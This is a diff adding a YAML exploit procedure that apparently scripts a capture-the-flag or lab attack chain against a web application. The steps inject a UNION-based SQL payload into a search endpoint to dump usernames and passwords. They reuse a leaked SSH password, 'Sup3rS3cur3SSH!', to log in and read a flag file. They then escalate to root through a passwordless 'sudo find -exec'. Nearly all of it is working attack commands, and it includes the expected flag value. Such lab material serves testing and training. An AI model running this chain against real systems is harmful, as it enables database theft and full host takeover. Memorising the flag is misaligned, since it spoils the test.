@@ -1,0 +1,107 @@
+sessions: []
+procedure:
+- step_id: verify_app_running
+  session: null
+  action:
+    type: http_request
+    method: GET
+    url: http://${system.target_system.host}:${system.target_system.port}/health
+    headers: {}
+    body: null
+  expect:
+    status: 200
+  outputs: {}
+  timeout: 10
+- step_id: exploit_sqli_union
+  session: null
+  action:
+    type: http_request
+    method: GET
+    url: http://${system.target_system.host}:${system.target_system.port}/search?q=x%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--+-
+    headers: {}
+    body: null
+  expect:
+    body_contains: sysadmin
+  outputs:
+    sqli_body: body
+  timeout: 10
+- step_id: verify_ssh_credentials
+  session: null
+  action:
+    type: http_request
+    method: GET
+    url: http://${system.target_system.host}:${system.target_system.port}/search?q=x%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--+-
+    headers: {}
+    body: null
+  expect:
+    body_contains: Sup3rS3cur3SSH!
+  outputs: {}
+  timeout: 10
+- step_id: verify_ssh_service
+  session: null
+  action:
+    type: exec_attacker
+    command: nc -z -w5 ${system.target_system.host} 22 && echo 'SSH_OPEN'
+  expect:
+    stdout_contains: SSH_OPEN
+  outputs: {}
+  timeout: 10
+- step_id: exploit_ssh_login
+  session: null
+  action:
+    type: exec_attacker
+    command: sshpass -p 'Sup3rS3cur3SSH!' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+      -o PasswordAuthentication=yes -o PreferredAuthentications=password -o PubkeyAuthentication=no
+      -o KbdInteractiveAuthentication=no sysadmin@${system.target_system.host} 'id'
+  expect:
+    stdout_contains: sysadmin
+  outputs: {}
+  timeout: 30
+- step_id: verify_low_privilege_flag
+  session: null
+  action:
+    type: exec_attacker
+    command: sshpass -p 'Sup3rS3cur3SSH!' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+      -o PasswordAuthentication=yes -o PreferredAuthentications=password -o PubkeyAuthentication=no
+      -o KbdInteractiveAuthentication=no sysadmin@${system.target_system.host} 'id
+      && groups && cat /home/sysadmin/flag.txt'
+  expect:
+    stdout_contains: FLAG{ssh_login_via_sqli_credential_leak}
+  outputs: {}
+  timeout: 30
+- step_id: enumerate_sudo
+  session: null
+  action:
+    type: exec_attacker
+    command: sshpass -p 'Sup3rS3cur3SSH!' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+      -o PasswordAuthentication=yes -o PreferredAuthentications=password -o PubkeyAuthentication=no
+      -o KbdInteractiveAuthentication=no sysadmin@${system.target_system.host} 'sudo
+      -l'
+  expect:
+    stdout_contains: NOPASSWD
+  outputs: {}
+  timeout: 10
+- step_id: exploit_sudo_find
+  session: null
+  action:
+    type: exec_attacker
+    command: sshpass -p 'Sup3rS3cur3SSH!' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+      -o PasswordAuthentication=yes -o PreferredAuthentications=password -o PubkeyAuthentication=no
+      -o KbdInteractiveAuthentication=no sysadmin@${system.target_system.host} 'sudo
+      find /. -maxdepth 0 -exec whoami \; -quit'
+  expect:
+    stdout_contains: root
+  outputs: {}
+  timeout: 10
+- step_id: verify_root_uid
+  session: null
+  action:
+    type: exec_attacker
+    command: sshpass -p 'Sup3rS3cur3SSH!' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+      -o PasswordAuthentication=yes -o PreferredAuthentications=password -o PubkeyAuthentication=no
+      -o KbdInteractiveAuthentication=no sysadmin@${system.target_system.host} 'sudo
+      find /. -maxdepth 0 -exec id \; -quit'
+  expect:
+    stdout_contains: uid=0(root)
+  outputs: {}
+  timeout: 10
